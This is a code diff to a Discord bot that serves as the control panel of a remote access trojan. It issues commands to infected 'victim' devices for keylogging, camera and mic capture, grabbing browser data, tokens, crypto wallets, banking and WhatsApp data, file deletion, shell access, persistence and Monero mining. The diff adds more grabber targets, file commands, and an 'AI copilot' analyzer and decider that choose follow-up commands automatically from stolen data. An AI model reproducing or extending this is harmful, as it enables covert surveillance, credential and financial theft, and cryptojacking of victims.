@@ -19,6 +19,8 @@ import { videoStream } from './stream.js'
 import { aiCoPilot } from './ai-copilot/index.js'
 import { aiContext } from './ai-copilot/context.js'
 import { campaignManager } from './ai-copilot/campaign.js'
+import { analyzeResults } from './ai-copilot/analyzer.js'
+import { decideNextActions } from './ai-copilot/decider.js'
 const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
 const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
 if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
@@ -284,18 +286,40 @@ async function sendCmdLogged(channel, cmd, payload, userId, userName) {
   return result
 }
 
-async function collectChannelResponse(channel, cmdName, timeoutMs = 20000) {
+async function collectChannelResponse(channel, cmdName, timeoutMs = 30000) {
   try {
-    const msgs = await channel.messages.fetch({ limit: 5 })
-    const response = msgs.find(m => m.author.bot && m.content && !m.content.includes(':heartbeat:') && (m.content.includes(`!${cmdName}`) || m.content.includes(`**${cmdName}`)))
-    if (response) return response.content.slice(0, 500)
-    // Wait for up to timeoutMs for a response
-    const collected = await new Promise((resolve) => {
-      const filter = (m) => m.author.bot && m.channel.id === channel.id && !m.content.includes(':heartbeat:')
-      const collector = channel.createMessageCollector({ filter, time: timeoutMs, max: 3 })
-      collector.on('end', (collected) => resolve(collected.first()?.content?.slice(0, 500) || null))
-    })
-    return collected
+    const before = Date.now()
+    // Wait for device to process and start responding
+    await new Promise(r => setTimeout(r, 3000))
+    const parts = []
+    let hasMore = true
+    while (hasMore && (Date.now() - before) < timeoutMs) {
+      const msgs = await channel.messages.fetch({ limit: 10 })
+      const botMsgs = msgs.filter(m =>
+        m.author.bot &&
+        m.content &&
+        !m.content.includes(':heartbeat:') &&
+        !m.content.includes('!ping') &&
+        !m.content.includes('!grabber') &&
+        m.createdTimestamp > before - 2000
+      )
+      for (const [, m] of botMsgs) {
+        const text = m.content
+        const attachments = m.attachments.map(a => `[FILE: ${a.name} (${formatSize(a.size)})]`).join(' ')
+        parts.push((attachments ? text + ' ' + attachments : text).slice(0, 800))
+      }
+      if (botMsgs.size === 0) {
+        // No new messages — wait a bit then check again
+        await new Promise(r => setTimeout(r, 2000))
+        if ((Date.now() - before) > timeoutMs) hasMore = false
+      } else {
+        // Got messages, wait for more to arrive
+        await new Promise(r => setTimeout(r, 3000))
+        if ((Date.now() - before) > timeoutMs) hasMore = false
+      }
+    }
+    const combined = parts.join('\n').slice(0, 5000)
+    return combined || null
   } catch { return null }
 }
 
@@ -400,7 +424,9 @@ function helpEmbed() {
     `${A.cyan}┃${A.reset} ${A.magenta}DATA${A.reset}        : !contacts !sms !call_log !wifi !battery !processes\n` +
     `${A.cyan}┃${A.reset}                : !installed !torch !vibrate\n` +
     `${A.cyan}┃${A.reset}\n` +
-    `${A.cyan}┃${A.reset} ${A.brightRed}GRABBER${A.reset}     : !grabber [all|browser|messenger|tokens|wallets|files|clipboard]\n` +
+    `${A.cyan}┃${A.reset} ${A.brightRed}GRABBER${A.reset}     : !grabber [all|browser|messenger|tokens|wallets|files|clipboard|banks|whatsapp|chrome|docs]\n` +
+    `${A.cyan}┃${A.reset}\n` +
+    `${A.cyan}┃${A.reset} ${A.yellow}FILES${A.reset}       : !dir !tree !find !cat !info !disk !recent !ext !download !rm !mv !cp !mkdir\n` +
     `${A.cyan}┃${A.reset}\n` +
     `${A.cyan}┃${A.reset} ${A.yellow}ADVANCED${A.reset}    : !wifipass !netstat !shell !persist\n` +
     `${A.cyan}┃${A.reset}\n` +
@@ -426,7 +452,8 @@ function helpEmbed() {
       { name: `${E.zap} RECON`, value: '`!ping` `!info` `!status` `!ip` `!uptime` `!debug` `!restart`', inline: true },
       { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
       { name: `${E.book} DATA`, value: '`!contacts` `!sms` `!call_log` `!wifi` `!battery` `!processes`', inline: true },
-      { name: `${E.diamond} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets]`', inline: true },
+      { name: `${E.diamond} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets|banks|whatsapp|chrome|docs]`', inline: true },
+      { name: `${E.scroll} FILES`, value: '`!dir` `!tree` `!find` `!cat` `!info` `!disk` `!recent` `!ext` `!download` `!rm` `!mv` `!cp` `!mkdir`', inline: true },
       { name: `${E.flame} ADVANCED`, value: '`!wifipass` `!netstat` `!shell` `!persist`', inline: true },
       { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen`', inline: true },
       { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
@@ -448,7 +475,7 @@ const SLASH_CMDS = [
   new SlashCommandBuilder().setName('history').setDescription('Show your command history'),
   new SlashCommandBuilder().setName('search').setDescription('Search victims by name').addStringOption(o => o.setName('query').setDescription('Search query').setRequired(true)),
   new SlashCommandBuilder().setName('send').setDescription('Send a command to a victim').addStringOption(o => o.setName('command').setDescription('Command name').setRequired(true)).addStringOption(o => o.setName('victim').setDescription('Victim channel name').setRequired(false)).addStringOption(o => o.setName('args').setDescription('Command arguments').setRequired(false)),
-  new SlashCommandBuilder().setName('grabber').setDescription('Run data grabber on victim').addStringOption(o => o.setName('target').setDescription('Grab target: all, browser, messenger, tokens, wallets, files, clipboard').setRequired(false)),
+  new SlashCommandBuilder().setName('grabber').setDescription('Run data grabber on victim').addStringOption(o => o.setName('target').setDescription('Grab target: all, browser, messenger, tokens, wallets, files, clipboard, banks, whatsapp, chrome, docs').setRequired(false)),
   new SlashCommandBuilder().setName('miner').setDescription('Control XMR mining').addStringOption(o => o.setName('action').setDescription('Action: start, stop, status, set_wallet, set_pool, set_threads').setRequired(false)).addStringOption(o => o.setName('value').setDescription('Value for action (e.g. wallet address)').setRequired(false)),
   new SlashCommandBuilder().setName('upload').setDescription('Upload file from device').addStringOption(o => o.setName('path').setDescription('File path on device').setRequired(true)),
   new SlashCommandBuilder().setName('stream').setDescription('Control live screen stream').addStringOption(o => o.setName('action').setDescription('Action: start, stop, or fps number (1-30)').setRequired(false)),
@@ -976,8 +1003,23 @@ client.on(Events.InteractionCreate, async (i) => {
         const r = await sendCmdLogged(ch, cmdName, pc.args || '', i.user.id, i.user.username)
         if (r.ok) {
           results.push(`[SENT] \`${pc.command}${pc.args ? ' ' + pc.args : ''}\` → ${ch.name}`)
-          const response = await collectChannelResponse(ch, cmdName, 20000)
-          if (response) { results.push(`[RESULT] ${response}`); aiContext.updateDeviceKnowledge(session, ch.id, `last_${cmdName}`, response) }
+          const isGrabber = cmdName === 'grabber'
+          const response = await collectChannelResponse(ch, cmdName, isGrabber ? 120000 : 30000)
+          if (response) {
+            results.push(`[RESULT] ${response.slice(0, 3000)}`)
+            aiContext.updateDeviceKnowledge(session, ch.id, `last_${cmdName}`, response.slice(0, 2000))
+            if (isGrabber) {
+              aiContext.addGrabRecord(session, ch.id, pc.args || 'all', response.slice(0, 500))
+              try {
+                const analysis = await analyzeResults(response, session)
+                results.push(`[ANALYZER] ${analysis.summary}`)
+                const decision = await decideNextActions(analysis, session)
+                if (decision.commands?.length) {
+                  results.push(`[DECIDER] Next: ${decision.commands.map(c => c.command + ' ' + (c.args || '')).join(', ')}`)
+                }
+              } catch {}
+            }
+          }
         } else { results.push(`[FAIL] \`${pc.command}\`: ${r.err}`) }
       }
       const resultText = results.join('\n')
